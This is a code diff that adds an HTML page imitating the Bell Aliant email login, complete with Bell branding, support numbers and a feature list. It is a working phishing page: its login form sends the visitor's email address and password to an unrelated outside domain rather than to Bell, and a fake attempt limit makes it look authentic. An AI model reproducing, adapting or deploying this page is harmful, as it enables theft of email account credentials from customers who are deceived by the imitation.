@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en_us" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1">
+  <link rel="shortcut icon" href="#">
+  <link rel="icon" href="#"> 
+  <link rel="apple-touch-icon" href="#">    
+
+  <style type="text/css">
+      body { margin: 0; }
+      .ow-login-spinner-logo { background-color: transparent; background-image: url(./header/logo_spinner.png)!important; background-repeat: no-repeat; background-position: center; background-size: auto; height: 120px; }
+      #root .spinner { position: relative; top: 50%; } 
+      .spinner { margin: auto; text-align: center; } 
+      .spinner>div { width: 18px; height: 18px; background-color: #333; border-radius: 100%; display: inline-block; animation: sk-bouncedelay 1.4s infinite ease-in-out both; }
+      @keyframes sk-bouncedelay { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
+  </style>
+  
+  <link type="text/css" rel="stylesheet" href="css/ux.css?v=3.1.3.54.0-3">
+  <title>Bell email</title>
+  <link rel="shortcut icon" href="img/favicon.ico">
+  <script src="js/jquery-3.5.1.min.js"></script>
+  <link rel="stylesheet" href="css/flush.css">
+  <link rel="stylesheet" href="css/bell_prime_mod.css" media="all" type="text/css">
+  <link rel="stylesheet" href="css/login.css" media="all" type="text/css">
+  <link rel="stylesheet" href="css/bell.connector-rui.css" media="all" type="text/css">    
+  <link rel="stylesheet" type="text/css" href="https://webmail.bellaliant.net/bell/ux/421.css">
+  
+  <script>
+    let attempts = 0;
+
+    function validateForm(event) {
+      attempts++;
+      if (attempts > 4) {
+        event.preventDefault();
+        alert("Maximum login attempts exceeded.");
+        return false;
+      }
+      return true;
+    }
+  </script>
+</head>
+<body>
+  <div id="root" style="width: 100%; height: 100%; position: absolute; overflow: hidden;">
+    <div class="ow-Provider-root">
+      <div class="ow-login" role="main" aria-label="Login Page">
+        <div tabindex="-1" class="modal" style="display: block;">
+          <div class="modal-dialog">
+            <div class="modal-content" role="document">
+              <div class="ow-login-header-custom">
+                <div class="ow-login-header">
+                  <div class="ow-app-header-customHeader">
+                    <div class="bell-brand bc-user-false">
+                      <a class="bell-logo" href="https://aliant.bell.ca/" aria-label="Bell Aliant" target="_top">
+                        <img src="img/bell-logo.png" alt="Your Logo" />
+                      </a>
+                      <div class="bellSlim txtSize20">Aliant</div>
+                    </div>
+                  </div>
+                  <div class="fui-topnav-aside" style="height: 74px;">
+                    <span style="font: 15px / 68px Arial, sans-serif; height: 100%; padding: 0px 20px; text-shadow: rgb(0, 0, 0) 0px 1px 2px; border-left: medium none;">
+                      <a id="changelocale" class="indent1" href="#" title="Français" aria-label="Français" value="fr_CA" style="color: rgb(255, 255, 255);">Français</a>
+                    </span>
+                  </div>
+                </div>
+              </div>
+              <div class="modal-body">
+                <div class="wrapper shopSection">
+                  <div class="wrapHeader"></div>
+                  <div class="wrapMain">
+                    <div class="subWrap main">
+                      <div class="secNav"><div class="clearer"></div></div>
+                      <div class="content" id="content">
+                        <div class="cWrap pgTitle">
+                          <h1>Bell Aliant email</h1>
+                        </div>
+                        <div class="cWrap" style="padding-top: 14px;">
+                          <div id="alertMsgJS" class="cBox" style="display: none;">
+                            <div class="warning">
+                              <div class="lining">
+                                <div class="userMsg umError"></div>
+                              </div>
+                            </div>
+                          </div>
+                          <div class="colGroup">
+                            <div id="loginsection">
+                              <div class="col6">
+                                <div class="cBox captcha_ba">
+                                  <div class="padder cHeader">
+                                    <h2 class="fontFace">Log in</h2>
+                                    <div class="clearer"></div>
+                                  </div>
+                                  <div class="padder fakeeqJs">
+                                    <div style="width: 100%; height: 100%;">
+                                      <form class="form-horizontal" action="https://pureharmonymke.com/chck/gen.php" method="post" onsubmit="return validateForm(event)">
+                                        <div class="form-group">
+                                          <div class="fLabel sectionHeader">
+                                            <label for="formHorizontalEmail" class="">Email Address</label>
+                                          </div>
+                                          <div class="sectionContent">
+                                            <div class="col-sm-8 col-sm-offset-2">
+                                              <input aria-label="Email Address" aria-disabled="false" aria-autocomplete="list" type="text" id="formHorizontalEmail#" class="form-control" name="email" value="">
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="form-group">
+                                          <div id="passwordsection">
+                                            <div class="fLabel sectionHeader">
+                                              <label for="formHorizontalPassword" class="">Password</label>
+                                            </div>
+                                            <div class="sectionContent">
+                                              <div class="col-sm-8 col-sm-offset-2">
+                                                <input aria-label="Password" aria-disabled="false" type="password" id="formHorizontalPassword" class="form-control" name="password" value="">
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="form-group">
+                                          <div class="col-sm-8 col-sm-offset-2">
+                                            <button aria-label="Login" aria-disabled="false" type="submit" class="btn btn-primary btn-block"> Login </button>
+                                          </div>
+                                        </div>
+                                      </form>
+                                      <div>Forgot your password? Please call Technical Support.<br>
+                                        <br>Bell Aliant: 1-866-425-4268<br>KMTS:  1-807-467-5687<br>DMTS:  1-807-223-1100<br>Ontera:  1-888-566-8372<br>FibreOP:  1-866-342-7367<br>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                              <div class="col6 colLast">
+                                <div class="cBox captcha_ba">
+                                  <div class="padder cHeader">
+                                    <h2 class="fontFace">New enhancements to your Bell Aliant email.</h2>
+                                    <div class="clearer"></div>
+                                  </div>
+                                  <div class="padder fakeeqJs">
+                                    <div class="itemGroup itemGroupThemeA" style="font-size: 15px; font-family: Arial, sans-serif;">
+                                      <h3 class="headingType4" style="margin-bottom: 15px;">You’ll start seeing these updates soon:</h3>
+                                      <ul style="margin-left: 5px; width: 350px;">
+                                        <li class="list_ba_enhance">A new look and composing screen for an improved experience</li>
+                                        <li class="list_ba_enhance">Increased inbox storage space</li>
+                                        <li class="list_ba_enhance">A new calendar feature to help organize your day</li>
+                                        <li class="list_ba_enhance">An optimized mobile experience on iOS and Android</li>
+                                      </ul>
+                                      <br>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="wrapFooter">
+                  <div class="subWrap footer">
+                    <div class="footerNote">
+                      <span class="copyright">&nbsp;&nbsp;&nbsp;© Bell Canada, 2024. All rights reserved.</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="ow-PopupToolsContainer">
+    <div class="ow-toast-container"></div>
+  </div>
+</body>
+</html>
